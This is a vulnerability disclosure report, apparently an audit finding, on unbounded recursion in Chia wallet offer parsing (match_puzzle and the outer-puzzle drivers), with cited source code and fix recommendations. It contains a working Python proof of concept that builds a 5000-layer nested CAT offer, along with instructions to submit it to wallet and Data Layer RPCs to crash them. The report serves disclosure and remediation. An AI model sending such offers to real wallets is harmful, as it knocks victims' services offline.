### Title
Uncontrolled recursion in `Offer`/`PuzzleInfo` outer-puzzle matching allows a remote offer counterparty to crash a wallet with `RecursionError` - (File: `chia/wallet/outer_puzzles.py`, `chia/wallet/puzzle_drivers.py`, `chia/wallet/trading/offer.py`)

### Summary
`Offer.from_bytes()`/`Offer.from_bech32()`/`Offer.from_spend_bundle()` build a `driver_dict` by calling `match_puzzle()` on every `CoinSpend.puzzle_reveal` in an untrusted offer file [1](#0-0) . `match_puzzle()` and each outer-puzzle driver's `.match()`/`get_inner_puzzle()`/`get_inner_solution()`/`.construct()` recurse once per curried puzzle layer via `self._match(...)` on the inner puzzle [2](#0-1) [3](#0-2) . `PuzzleInfo.also()`/`check_type()`/`decode_info_value()` mirror this recursive "also" chain in pure Python with no depth cap [4](#0-3) . This is structurally identical to the `cbor2` bug class: attacker-controlled nesting depth reaches an unguarded recursive Python parser/matcher, and Python's finite call-stack recursion limit turns into an unhandled `RecursionError`.

### Finding Description
A CAT/singleton/ownership/CR "outer puzzle" is just a CLVM curry wrapping an inner puzzle; wrapping is a pure structural operation (`MOD.curry(...)`) that requires no valid keys, tails, or proofs to construct. An attacker can trivially build a `puzzle_reveal` with thousands of nested CAT (or singleton/ownership/CR) layers, e.g. by repeatedly calling `construct_cat_puzzle(CAT_MOD, tail, construct_cat_puzzle(CAT_MOD, tail, ...))`, and place it as one `CoinSpend` inside a `WalletSpendBundle`, then produce an `Offer` from it (`Offer.from_spend_bundle`, exactly as exercised in tests such as `chia/_tests/wallet/cat_wallet/test_cat_outer_puzzle.py` which double-wraps a CAT puzzle) [5](#0-4) .

When a victim wallet receives that offer (as a bech32 string, hex blob, or bytes) and merely parses/summarizes it — `Offer.from_bech32()`, `Offer.from_bytes()`, `take_offer`/`respond_to_offer`/`check_offer_validity`/`get_offer_summary` RPCs — the wallet calls `Offer.from_spend_bundle()`, which calls `match_puzzle()` on the crafted puzzle reveal [6](#0-5) . Each nesting level of the driver's `.match()` triggers another Python-level recursive call through `self._match(UnknownPuzzle(known_program=inner_puzzle))` with no depth check, and further recursion occurs in `get_inner_puzzle`, `get_inner_solution`, `construct`, and `PuzzleInfo.also()/check_type()` whenever the offer is subsequently processed (`get_offered_coins()`, `summary()`, `to_valid_spend()`) [7](#0-6) . With a sufficiently deep chain (a few hundred to a few thousand layers, well within Python's default `sys.getrecursionlimit()` of ~1000), this raises an unhandled `RecursionError`.

None of the call sites that invoke `match_puzzle`/`Offer.from_bytes` on attacker-supplied offer data (`chia/wallet/wallet_rpc_api.py:take_offer/check_offer_validity`, `chia/cmds/wallet_funcs.py:take_offer`, `chia/data_layer/data_layer.py:take_offer`, `chia/data_layer/data_layer_rpc_api.py:verify_offer`) catch `RecursionError` [8](#0-7) [9](#0-8) . An uncaught `RecursionError` at this stack depth typically propagates through the RPC framework and can terminate/hang the wallet or data-layer service worker handling the request.

Unlike consensus-critical `Program`/CLVM parsing, which is delegated to a Rust CLVM parser via `run_chia_program`/`chia_rs` (bounded and hardened against this class of recursion issue) [10](#0-9) , this specific matching/driver layer is pure Python and unguarded.

### Impact Explanation
An unauthenticated offer counterparty (anyone who can hand a wallet user an offer file/bech32 string — a routine, expected interaction in Chia's offer-exchange model) can crash or hang the victim's wallet RPC service (and potentially the Data Layer service via `verify_offer`/`take_offer`) with a single crafted, cheaply constructed offer, before any signature or on-chain validation occurs. This is a spend/action-triggered transaction-processing halt, matching the accepted impact categories (spend-triggered halt / DoS of wallet processing). It does not by itself cause fund loss or consensus divergence, keeping it in the High (not Critical) range, consistent with the CBOR2 advisory's own severity classification.

### Likelihood Explanation
High likelihood of triggering: constructing a deeply nested but structurally valid CAT/singleton/ownership curry chain requires no cryptographic material and is inexpensive; sharing an offer file/bech32 string with another wallet user or through the offer-exchange RPC endpoints is a completely normal, low-privilege user action. Any code path that parses an incoming offer (`take_offer`, `check_offer_validity`, `get_offer`, DL `verify_offer`) is affected as soon as the file is decoded.

### Recommendation
- Add explicit depth limits to `match_puzzle()`, `PuzzleInfo.also()/check_type()/decode_info_value()`, and each outer-puzzle driver's recursive `match/get_inner_puzzle/get_inner_solution/construct/solve` methods (e.g., a `max_depth` parameter that raises a normal, catchable `ValueError` once exceeded), mirroring the non-recursive design already used for `sha256_treehash` (`chia/types/blockchain_format/tree_hash.py`) [11](#0-10) .
- Alternatively/additionally, convert these matching functions to an iterative (worklist/stack-based) implementation instead of native Python recursion.
- Wrap offer-ingestion RPC handlers (`take_offer`, `check_offer_validity`, DL `verify_offer`/`take_offer`) to catch `RecursionError` and translate it into a normal validation failure rather than letting it propagate and crash/hang the service.

### Proof of Concept
```python
from chia.types.blockchain_format.coin import Coin
from chia.types.blockchain_format.program import Program
from chia.types.coin_spend import make_spend
from chia.wallet.cat_wallet.cat_utils import CAT_MOD, construct_cat_puzzle
from chia.wallet.trading.offer import Offer
from chia.wallet.wallet_spend_bundle import WalletSpendBundle
from chia_rs import G2Element
from chia_rs.sized_bytes import bytes32
from chia_rs.sized_ints import uint64

ACS = Program.to(1)
tail = bytes32.zeros

# Build a deeply nested CAT-in-CAT-in-CAT... puzzle reveal.
# Purely structural curry construction, no valid tail/keys required.
puzzle = ACS
DEPTH = 5000
for _ in range(DEPTH):
    puzzle = construct_cat_puzzle(CAT_MOD, tail, puzzle)

coin = Coin(bytes32.zeros, puzzle.get_tree_hash(), uint64(0))
spend = make_spend(coin, puzzle, Program.to([]))
bundle = WalletSpendBundle([spend], G2Element())

# A victim wallet parsing this "offer" (e.g. via take_offer/check_offer_validity RPC,
# or `chia wallet take_offer`) triggers unbounded Python recursion in match_puzzle():
offer = Offer.from_spend_bundle(bundle)  # -> RecursionError, uncaught by callers
```
Sending the resulting `bytes(offer)`/`offer.to_bech32()` string to a wallet's `take_offer`, `check_offer_validity`, or `get_offer_summary` RPC endpoint (or the Data Layer `verify_offer`/`take_offer` RPCs) reproduces the crash without requiring any prior authentication or valid puzzle semantics.

### Citations

**File:** chia/wallet/trading/offer.py (L244-303)
```python
    def _get_offered_coins(self) -> dict[bytes32 | None, list[Coin]]:
        offered_coins: dict[bytes32 | None, list[Coin]] = {}

        cost_left = INFINITE_COST
        for parent_spend in self._bundle.coin_spends:
            coins_for_this_spend: list[Coin] = []

            parent_puzzle: UnknownPuzzle = UnknownPuzzle(known_program=parent_spend.puzzle_reveal)
            parent_solution = Program.from_serialized(parent_spend.solution)
            additions: list[Coin] = self._additions[parent_spend.coin]

            puzzle_driver = match_puzzle(parent_puzzle)
            if puzzle_driver is not None:
                asset_id = create_asset_id(puzzle_driver)
                inner_puzzle: Program | None = get_inner_puzzle(puzzle_driver, parent_puzzle, parent_solution)
                inner_solution: Program | None = get_inner_solution(puzzle_driver, parent_solution)
                assert inner_puzzle is not None and inner_solution is not None

                # We're going to look at the conditions created by the inner puzzle
                puzzle_cost, conditions = inner_puzzle.run_with_cost(cost_left, inner_solution)
                assert cost_left >= puzzle_cost
                cost_left -= puzzle_cost
                expected_num_matches: int = 0
                offered_amounts: list[int] = []
                for condition in conditions.as_iter():
                    if condition.first() == 51 and condition.rest().first() == OFFER_MOD_HASH:
                        expected_num_matches += 1
                        offered_amounts.append(condition.rest().rest().first().as_int())

                # Start by filtering additions that match the amount
                matching_spend_additions = [a for a in additions if a.amount in offered_amounts]

                if len(matching_spend_additions) == expected_num_matches:
                    coins_for_this_spend.extend(matching_spend_additions)
                # We didn't quite get there so now lets narrow it down by puzzle hash
                else:
                    # If we narrowed down too much, we can't trust the amounts so start over with all additions
                    if len(matching_spend_additions) < expected_num_matches:
                        matching_spend_additions = additions
                    matching_spend_additions = [
                        a
                        for a in matching_spend_additions
                        if a.puzzle_hash == construct_puzzle(puzzle_driver, OFFER_MOD).get_tree_hash()
                    ]
                    if len(matching_spend_additions) == expected_num_matches:
                        coins_for_this_spend.extend(matching_spend_additions)
                    else:
                        raise ValueError("Could not properly guess offered coins from parent spend")
            else:
                # It's much easier if the asset is bare XCH
                asset_id = None
                coins_for_this_spend.extend([a for a in additions if a.puzzle_hash == OFFER_MOD_HASH])

            # We only care about unspent coins
            coins_for_this_spend = [c for c in coins_for_this_spend if c not in self._bundle.removals()]

            if coins_for_this_spend != []:
                offered_coins.setdefault(asset_id, [])
                offered_coins[asset_id].extend(coins_for_this_spend)
        return offered_coins
```

**File:** chia/wallet/trading/offer.py (L634-663)
```python
    @classmethod
    def from_spend_bundle(cls, bundle: WalletSpendBundle) -> Offer:
        # Because of the `to_spend_bundle` method, we need to parse the dummy CoinSpends as `requested_payments`
        requested_payments: dict[bytes32 | None, list[NotarizedPayment]] = {}
        driver_dict: dict[bytes32, PuzzleInfo] = {}
        leftover_coin_spends: list[CoinSpend] = []
        for coin_spend in bundle.coin_spends:
            driver = match_puzzle(UnknownPuzzle(known_program=coin_spend.puzzle_reveal))
            if driver is not None:
                asset_id = create_asset_id(driver)
                assert asset_id is not None
                driver_dict[asset_id] = driver
            else:
                asset_id = None
            if coin_spend.coin.parent_coin_info == bytes32.zeros:
                notarized_payments: list[NotarizedPayment] = []
                for payment_group in Program.from_serialized(coin_spend.solution).as_iter():
                    nonce = bytes32(payment_group.first().as_atom())
                    payment_args_list = payment_group.rest().as_iter()
                    notarized_payments.extend(
                        [NotarizedPayment.from_condition_and_nonce(condition, nonce) for condition in payment_args_list]
                    )

                requested_payments[asset_id] = notarized_payments
            else:
                leftover_coin_spends.append(coin_spend)

        return cls(
            requested_payments, WalletSpendBundle(leftover_coin_spends, bundle.aggregated_signature), driver_dict
        )
```

**File:** chia/wallet/cat_wallet/cat_outer_puzzle.py (L33-45)
```python
    def match(self, puzzle: UnknownPuzzle) -> PuzzleInfo | None:
        args = match_cat_puzzle(puzzle)
        if args is None:
            return None
        _, tail_hash, inner_puzzle = args
        constructor_dict: dict[str, Any] = {
            "type": "CAT",
            "tail": "0x" + tail_hash.as_atom().hex(),
        }
        next_constructor = self._match(UnknownPuzzle(known_program=inner_puzzle))
        if next_constructor is not None:
            constructor_dict["also"] = next_constructor.info
        return PuzzleInfo(constructor_dict)
```

**File:** chia/wallet/nft_wallet/singleton_outer_puzzle.py (L32-54)
```python
    def match(self, puzzle: UnknownPuzzle) -> PuzzleInfo | None:
        matched, curried_args = match_singleton_puzzle(puzzle)
        if matched:
            singleton_struct, inner_puzzle = curried_args
            pair = singleton_struct.pair
            assert pair is not None
            launcher_struct = pair[1].pair
            assert launcher_struct is not None
            launcher_id = launcher_struct[0].atom
            assert launcher_id is not None
            launcher_ph = launcher_struct[1].atom
            assert launcher_ph is not None
            constructor_dict: dict[str, Any] = {
                "type": "singleton",
                "launcher_id": "0x" + launcher_id.hex(),
                "launcher_ph": "0x" + launcher_ph.hex(),
            }
            next_constructor = self._match(UnknownPuzzle(known_program=inner_puzzle))
            if next_constructor is not None:
                constructor_dict["also"] = next_constructor.info
            return PuzzleInfo(constructor_dict)
        else:
            return None
```

**File:** chia/wallet/puzzle_drivers.py (L60-79)
```python
    def also(self) -> PuzzleInfo | None:
        if "also" in self.info:
            return PuzzleInfo(self.info["also"])
        else:
            return None

    def check_type(self, types: list[str]) -> bool:
        if types == []:
            if self.also() is None:
                return True
            else:
                return False
        elif self.type() == types[0]:
            types.pop(0)
            if self.also():
                return self.also().check_type(types)  # type: ignore
            else:
                return self.check_type(types)
        else:
            return False
```

**File:** chia/_tests/wallet/cat_wallet/test_cat_outer_puzzle.py (L17-33)
```python
def test_cat_outer_puzzle() -> None:
    ACS = Program.to(1)
    tail = bytes32.zeros
    cat_puzzle: Program = construct_cat_puzzle(CAT_MOD, tail, ACS)
    double_cat_puzzle: Program = construct_cat_puzzle(CAT_MOD, tail, cat_puzzle)
    uncurried_cat_puzzle = UnknownPuzzle(known_program=double_cat_puzzle)
    cat_driver: PuzzleInfo | None = match_puzzle(uncurried_cat_puzzle)

    assert cat_driver is not None
    assert cat_driver.type() == "CAT"
    assert cat_driver["tail"] == tail
    inside_cat_driver: PuzzleInfo | None = cat_driver.also()
    assert inside_cat_driver is not None
    assert inside_cat_driver.type() == "CAT"
    assert inside_cat_driver["tail"] == tail
    assert construct_puzzle(cat_driver, ACS) == double_cat_puzzle
    assert get_inner_puzzle(cat_driver, uncurried_cat_puzzle) == ACS
```

**File:** chia/wallet/wallet_rpc_api.py (L2042-2064)
```python
    async def check_offer_validity(self, request: CheckOfferValidity) -> CheckOfferValidityResponse:
        offer = Offer.from_bech32(request.offer)
        peer = self.service.get_full_node_peer()
        return CheckOfferValidityResponse(
            valid=(await self.service.wallet_state_manager.trade_manager.check_offer_validity(offer, peer)),
            id=offer.name(),
        )

    async def take_offer(
        self,
        request: TakeOffer,
        action_scope: WalletActionScope,
        extra_conditions: tuple[Condition, ...] = tuple(),
    ) -> TakeOfferResponse:
        peer = self.service.get_full_node_peer()
        trade_record = await self.service.wallet_state_manager.trade_manager.respond_to_offer(
            request.parsed_offer,
            peer,
            action_scope,
            fee=request.fee,
            solver=request.solver,
            extra_conditions=extra_conditions,
        )
```

**File:** chia/data_layer/data_layer.py (L1271-1284)
```python
    async def take_offer(
        self,
        offer_bytes: bytes,
        taker: tuple[OfferStore, ...],
        maker: tuple[StoreProofs, ...],
        fee: uint64,
    ) -> TradeRecord:
        async with self.data_store.transaction():
            our_store_proofs = await self.process_offered_stores(offer_stores=taker)

            offer = TradingOffer.from_bytes(offer_bytes)
            summary = await DataLayerWallet.get_offer_summary(offer=offer)

            verify_offer(maker=maker, taker=taker, summary=summary)
```

**File:** chia/types/blockchain_format/program.py (L56-68)
```python
    @classmethod
    def from_bytes(cls, blob: bytes) -> Self:
        # this runs the program "1", which just returns the first argument.
        # the first argument is the buffer we want to parse. This effectively
        # leverages the rust parser and LazyNode, making it a lot faster to
        # parse serialized programs into a python compatible structure
        _cost, ret = run_chia_program(
            b"\x01",
            blob,
            50,
            0,
        )
        return cls.to(ret)
```

**File:** chia/types/blockchain_format/tree_hash.py (L1-8)
```python
"""
This is an implementation of `sha256_treehash`, used to calculate
puzzle hashes in clvm.

This implementation goes to great pains to be non-recursive so we don't
have to worry about blowing out the python stack.
"""

```
